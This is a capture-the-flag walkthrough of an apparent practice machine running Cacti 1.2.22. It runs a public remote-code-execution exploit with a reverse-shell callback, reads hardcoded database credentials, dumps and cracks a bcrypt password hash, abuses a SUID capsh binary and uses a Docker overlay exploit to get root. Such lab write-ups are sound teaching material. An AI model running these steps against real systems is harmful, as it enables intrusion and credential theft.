# Scan the IP

Initial `nmap` scan shows there are two ports open on the machine

1. HTTP
2. SSH

```shell
❯ nmap -sC -sV -vvv --min-rate=700 -Pn 10.10.11.211 | tee nmap.log
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-18 18:29 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:29
Completed Parallel DNS resolution of 1 host. at 18:29, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 4, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:29
Scanning 10.10.11.211 (10.10.11.211) [1000 ports]
Discovered open port 22/tcp on 10.10.11.211
Discovered open port 80/tcp on 10.10.11.211
Completed Connect Scan at 18:29, 1.14s elapsed (1000 total ports)
Initiating Service scan at 18:29
Scanning 2 services on 10.10.11.211 (10.10.11.211)
Completed Service scan at 18:29, 6.28s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.211.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 3.99s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.55s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
Nmap scan report for 10.10.11.211 (10.10.11.211)
Host is up, received user-set (0.084s latency).
Scanned at 2023-05-18 18:29:35 IST for 12s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:29
Completed NSE at 18:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.81 seconds
```

# Manual Enumeration of Web

- Web page shows `cacti` tried default passwords, but no success.

![Image](https://raw.githubusercontent.com/divu050704/assets-holder/main/tryhackme-screenshots/Screenshot%202023-05-18%20at%2019-17-33%20Login%20to%20Cacti.png)

- Checked if `Cacti Version 1.2.22` is vulnerable to a vulnerability and found an exploit [CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
- This exploit allows unauthenticated Remote Code Execution on the machine.
- Started the exploit. 

```shell
❯ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.14.10  --LPORT=4444
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!

```

- Got back a shell.

```shell
 www-data@50bca5e748b0:/var/www/html$ ls
CHANGELOG		    automation_tree_rules.php  data_input.php		   graph_view.php      locales		       poller_recovery.php   sites.php
LICENSE			    boost_rrdupdate.php        data_queries.php		   graph_xport.php     log		       poller_reports.php    snmpagent_mibcache.php
README.md		    cache		       data_source_profiles.php    graphs.php	       logout.php	       poller_spikekill.php  snmpagent_mibcachechild.php
about.php		    cacti.sql		       data_sources.php		   graphs_items.php    managers.php	       pollers.php	     snmpagent_persist.php
aggregate_graphs.php	    cactid.php		       data_templates.php	   graphs_new.php      mibs		       remote_agent.php      spikekill.php
aggregate_items.php	    cdef.php		       docs			   help.php	       permission_denied.php   reports_admin.php     templates_export.php
aggregate_templates.php     cli			       formats			   host.php	       plugins		       reports_user.php      templates_import.php
auth_changepassword.php     clog.php		       gprint_presets.php	   host_templates.php  plugins.php	       resource		     tree.php
auth_login.php		    clog_user.php	       graph.php		   images	       poller.php	       rra		     user_admin.php
auth_profile.php	    cmd.php		       graph_image.php		   include	       poller_automation.php   rrdcleaner.php	     user_domains.php
automation_devices.php	    cmd_realtime.php	       graph_json.php		   index.php	       poller_boost.php        script_server.php     user_group_admin.php
automation_graph_rules.php  color.php		       graph_realtime.php	   install	       poller_commands.php     scripts		     utilities.php
automation_networks.php     color_templates.php        graph_templates.php	   lib		       poller_dsstats.php      service		     vdef.php
automation_snmp.php	    color_templates_items.php  graph_templates_inputs.php  link.php	       poller_maintenance.php  service_check.php
automation_templates.php    data_debug.php	       graph_templates_items.php   links.php	       poller_realtime.php     settings.php

```

# User Flag

- Tried searching for other users on the system and the user flag, but found nothing.
- It looks like we are in a docker.

```shell
) www-data@50bca5e748b0:/var/www/html$ ls -la /  
total 84
drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 May 18 13:21 dev
-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root 4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root 4096 Mar 22 13:21 home
drwxr-xr-x   1 root root 4096 Nov 15  2022 lib
drwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4096 Mar 22 13:21 media
drwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4096 Mar 22 13:21 opt
dr-xr-xr-x 307 root root    0 May 18 13:21 proc
drwx------   1 root root 4096 Mar 21 10:50 root
drwxr-xr-x   1 root root 4096 Nov 15  2022 run
drwxr-xr-x   1 root root 4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 May 18 13:21 sys
drwxrwxrwt   1 root root 4096 May 18 13:21 tmp
drwxr-xr-x   1 root root 4096 Nov 14  2022 usr
drwxr-xr-x   1 root root 4096 Nov 15  2022 var

```

- Found `entrypoint.sh` in root directory.

```shell
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"

```

- This shell file gives username and password for `MySQL` which can allow us to get username and password for `cacti`. 

```shell
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show tables
> "
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
<----------SNIP-------------------------->
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+

```

- `user_auth` may have credentials, so tried reading it.

```shell
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+

```

- Found hashed password for user Marcus, which looks like `bcrypt $2*$, Blowfish (Unix)`. 
- Saved the hash and cracked it with `hashcat` (I have already cracked it)

```shell
❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt   --show
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

- Log into the machine as `marcus`

```shell
❯ ssh marcus@10.10.11.211
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 May 2023 01:24:02 PM UTC

  System load:                      0.13
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     13%
  Swap usage:                       0%
  Processes:                        272
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:c012


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ ls
user.txt

```

# Root flag

- Checked for docker version.

```shell
marcus@monitorstwo:~$ docker -v
Docker version 20.10.5+dfsg1, build 55c4c88

```

- Checked for vulnerabilities and found an exploit. ([CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091))

- Downloaded the exploit on `marcus` machine and execute it.

```shell
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): 

```

- We need to gain root access on docker to start the exploit. 

- Searched for `SUID` and found `capsh` 

```shell
www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

- Exploited it from [GTFOBINS](https://gtfobins.github.io/gtfobins/capsh/#suid) 

```shell
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html#
```

- Give `SUID` permission to `/bin/bash`

```shell
root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
```

- Entered `yes` on the exploit on `marcus` machine.

```shell
marcus@monitorstwo:/tmp$ ./CVE-2021-41091.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit

```

- Moved to `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged` .

- Found `bash` as `SUID`.

```shell
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l
total 5596
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
-rwxr-xr-x 3 root root   38984 Jul 20  2020 bunzip2
-rwxr-xr-x 3 root root   38984 Jul 20  2020 bzcat
lrwxrwxrwx 1 root root       6 Jul 20  2020 bzcmp -> bzdiff
-rwxr-xr-x 1 root root    2225 Jul 20  2020 bzdiff
lrwxrwxrwx 1 root root       6 Jul 20  2020 bzegrep -> bzgrep
-rwxr-xr-x 1 root root    4877 Sep  4  2019 bzexe
lrwxrwxrwx 1 root root       6 Jul 20  2020 bzfgrep -> bzgrep
-rwxr-xr-x 1 root root    3775 Jul 20  2020 bzgrep
-rwxr-xr-x 3 root root   38984 Jul 20  2020 bzip2
-rwxr-xr-x 1 root root   18424 Jul 20  2020 bzip2recover
lrwxrwxrwx 1 root root       6 Jul 20  2020 bzless -> bzmore
-rwxr-xr-x 1 root root    1297 Jul 20  2020 bzmore
-rwxr-xr-x 1 root root   43936 Sep 24  2020 cat
-rwxr-xr-x 1 root root   72672 Sep 24  2020 chgrp
-rwxr-xr-x 1 root root   64448 Sep 24  2020 chmod
-rwxr-xr-x 1 root root   72672 Sep 24  2020 chown
-rwxr-xr-x 1 root root  151168 Sep 24  2020 cp
-rwxr-xr-x 1 root root  125560 Dec 10  2020 dash
-rwxr-xr-x 1 root root  113664 Sep 24  2020 date
-rwxr-xr-x 1 root root   80968 Sep 24  2020 dd
-rwxr-xr-x 1 root root   93936 Sep 24  2020 df
-rwxr-xr-x 1 root root  147176 Sep 24  2020 dir
-rwxr-xr-x 1 root root   84440 Jan 20  2022 dmesg
lrwxrwxrwx 1 root root       8 Nov  7  2019 dnsdomainname -> hostname
lrwxrwxrwx 1 root root       8 Nov  7  2019 domainname -> hostname
-rwxr-xr-x 1 root root   39712 Sep 24  2020 echo
-rwxr-xr-x 1 root root      28 Nov  9  2020 egrep
-rwxr-xr-x 1 root root   39680 Sep 24  2020 false
-rwxr-xr-x 1 root root      28 Nov  9  2020 fgrep
-rwxr-xr-x 1 root root   69032 Jan 20  2022 findmnt
-rwxr-xr-x 1 root root  203072 Nov  9  2020 grep
-rwxr-xr-x 2 root root    2346 Apr 10  2022 gunzip
-rwxr-xr-x 1 root root    6447 Apr 10  2022 gzexe
-rwxr-xr-x 1 root root   98048 Apr 10  2022 gzip
-rwxr-xr-x 1 root root   22600 Nov  7  2019 hostname
-rwxr-xr-x 1 root root   30952 Apr  6  2021 kill
-rwxr-xr-x 1 root root   72840 Sep 24  2020 ln
-rwxr-xr-x 1 root root   56952 Feb  7  2020 login
-rwxr-xr-x 1 root root  147176 Sep 24  2020 ls
-rwxr-xr-x 1 root root  149736 Jan 20  2022 lsblk
-rwxr-xr-x 1 root root   85184 Sep 24  2020 mkdir
-rwxr-xr-x 1 root root   76896 Sep 24  2020 mknod
-rwxr-xr-x 1 root root   48064 Sep 24  2020 mktemp
-rwxr-xr-x 1 root root   59632 Jan 20  2022 more
-rwsr-xr-x 1 root root   55528 Jan 20  2022 mount
-rwxr-xr-x 1 root root   18664 Jan 20  2022 mountpoint
-rwxr-xr-x 1 root root  147080 Sep 24  2020 mv
lrwxrwxrwx 1 root root       8 Nov  7  2019 nisdomainname -> hostname
lrwxrwxrwx 1 root root      14 Dec 16  2021 pidof -> /sbin/killall5
-rwxr-xr-x 1 root root  137680 Apr  6  2021 ps
-rwxr-xr-x 1 root root   43872 Sep 24  2020 pwd
lrwxrwxrwx 1 root root       4 Mar 27  2022 rbash -> bash
-rwxr-xr-x 1 root root   52032 Sep 24  2020 readlink
-rwxr-xr-x 1 root root   72704 Sep 24  2020 rm
-rwxr-xr-x 1 root root   52032 Sep 24  2020 rmdir
-rwxr-xr-x 1 root root   27472 Sep 27  2020 run-parts
-rwxr-xr-x 1 root root  122224 Dec 22  2018 sed
lrwxrwxrwx 1 root root       4 Nov 14  2022 sh -> dash
-rwxr-xr-x 1 root root   43808 Sep 24  2020 sleep
-rwxr-xr-x 1 root root   84928 Sep 24  2020 stty
-rwsr-xr-x 1 root root   71912 Jan 20  2022 su
-rwxr-xr-x 1 root root   39744 Sep 24  2020 sync
-rwxr-xr-x 1 root root  531928 Feb 17  2021 tar
-rwxr-xr-x 1 root root   14456 Sep 27  2020 tempfile
-rwxr-xr-x 1 root root  101408 Sep 24  2020 touch
-rwxr-xr-x 1 root root   39680 Sep 24  2020 true
-rwsr-xr-x 1 root root   35040 Jan 20  2022 umount
-rwxr-xr-x 1 root root   39744 Sep 24  2020 uname
-rwxr-xr-x 2 root root    2346 Apr 10  2022 uncompress
-rwxr-xr-x 1 root root  147176 Sep 24  2020 vdir
-rwxr-xr-x 1 root root   63744 Jan 20  2022 wdctl
lrwxrwxrwx 1 root root       8 Nov  7  2019 ypdomainname -> hostname
-rwxr-xr-x 1 root root    1984 Apr 10  2022 zcat
-rwxr-xr-x 1 root root    1678 Apr 10  2022 zcmp
-rwxr-xr-x 1 root root    5898 Apr 10  2022 zdiff
-rwxr-xr-x 1 root root      29 Apr 10  2022 zegrep
-rwxr-xr-x 1 root root      29 Apr 10  2022 zfgrep
-rwxr-xr-x 1 root root    2081 Apr 10  2022 zforce
-rwxr-xr-x 1 root root    8049 Apr 10  2022 zgrep
-rwxr-xr-x 1 root root    2206 Apr 10  2022 zless
-rwxr-xr-x 1 root root    1842 Apr 10  2022 zmore
-rwxr-xr-x 1 root root    4577 Apr 10  2022 znew

```

- Executed `./bash -p` and got root on the main machine.

```shell
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
bash-5.1# whoami
root
```
